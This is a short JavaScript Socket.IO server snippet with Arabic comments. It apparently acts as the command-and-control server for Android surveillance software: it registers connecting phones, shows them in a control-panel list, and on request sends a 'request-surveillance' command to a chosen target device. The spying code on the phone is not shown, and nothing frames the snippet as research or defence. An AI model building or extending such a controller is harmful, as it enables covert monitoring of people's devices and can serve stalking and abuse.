io.on('connection', (socket) => {
  console.log('جهاز متصل جديد:', socket.id);

  // استقبال حدث تسجيل الجهاز القادم من تطبيق الأندرويد
  socket.on('register-device', (deviceName) => {
    socket.data.deviceName = deviceName;
    console.log(`تم تسجيل الجهاز بنجاح: ${deviceName} بمعرف الاتصال: ${socket.id}`);
    
    // إرسال قائمة الأجهزة المتصلة لوحة التحكم
    const devices = [];
    io.sockets.sockets.forEach((s) => {
      if (s.data.deviceName) {
        devices.push({ id: s.id, name: s.data.deviceName });
      }
    });
    io.emit('update-device-list', devices);
  });

  // إرسال أمر المراقبة إلى التطبيق المستهدف عند الطلب
  socket.on('trigger-surveillance', (targetSocketId) => {
    io.to(targetSocketId).emit('request-surveillance');
    console.log(`تم إرسال أمر المراقبة للجهاز: ${targetSocketId}`);
  });

  socket.on('disconnect', () => {
    console.log('جهاز قطع الاتصال:', socket.id);
  });
});
